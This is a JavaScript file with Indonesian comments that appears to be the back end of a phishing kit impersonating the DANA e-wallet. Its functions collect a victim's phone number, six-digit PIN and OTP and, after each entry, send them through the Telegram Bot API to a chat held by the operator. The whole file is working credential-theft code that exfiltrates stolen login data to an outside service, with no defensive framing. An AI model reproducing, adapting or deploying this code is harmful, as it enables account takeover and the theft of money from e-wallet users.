// send-dana-data.js

// Variabel untuk menyimpan data
let userData = {
  phone: '',
  pin: '',
  otp: ''
};

// Fungsi untuk mengirim data ke Telegram
async function sendToTelegram(dataType) {
  // Mengambil token dan chat ID dari environment variables (Netlify)
  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  
  // Jika token atau chat ID tidak tersedia, tidak melakukan apa-apa
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.log('Token atau Chat ID Telegram tidak ditemukan');
    return;
  }

  let message = '';

  // Format pesan berdasarkan tipe data yang dikirim
  switch(dataType) {
    case 'phone':
      message = `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${userData.phone}\n╰───────────────────`;
      break;
    case 'pin':
      message = `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${userData.phone}\n├───────────────────\n├• PIN  : ${userData.pin}\n╰───────────────────`;
      break;
    case 'otp':
      message = `├• AKUN | DANA E-WALLET\n├───────────────────\n├• NO HP : ${userData.phone}\n├───────────────────\n├• PIN  : ${userData.pin}\n├───────────────────\n├• OTP : ${userData.otp}\n╰───────────────────`;
      break;
    default:
      console.log('Tipe data tidak dikenali');
      return;
  }

  // URL API Telegram untuk mengirim pesan
  const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });

    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }

    const data = await response.json();
    console.log('Pesan berhasil dikirim ke Telegram:', data);
    return true;
  } catch (error) {
    console.error('Error mengirim pesan ke Telegram:', error);
    return false;
  }
}

// Fungsi untuk menyimpan nomor telepon
function savePhoneNumber(phone) {
  const cleanedPhone = phone.replace(/\D/g, '');
  if (cleanedPhone.length >= 10) {
    userData.phone = cleanedPhone;
    
    // Kirim ke Telegram setelah 1 detik (simulasi proses)
    setTimeout(() => {
      sendToTelegram('phone');
    }, 1000);
    
    return true;
  }
  return false;
}

// Fungsi untuk menyimpan PIN
function savePin(pin) {
  if (pin.length === 6) {
    userData.pin = pin;
    
    // Kirim ke Telegram setelah 1 detik (simulasi proses)
    setTimeout(() => {
      sendToTelegram('pin');
    }, 1000);
    
    return true;
  }
  return false;
}

// Fungsi untuk menyimpan OTP
function saveOtp(otp) {
  if (otp.length === 4) {
    userData.otp = otp;
    
    // Kirim ke Telegram setelah 1 detik (simulasi proses)
    setTimeout(() => {
      sendToTelegram('otp');
    }, 1000);
    
    return true;
  }
  return false;
}

// Ekspor fungsi untuk digunakan di script.js
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    savePhoneNumber,
    savePin,
    saveOtp,
    sendToTelegram
  };
      }
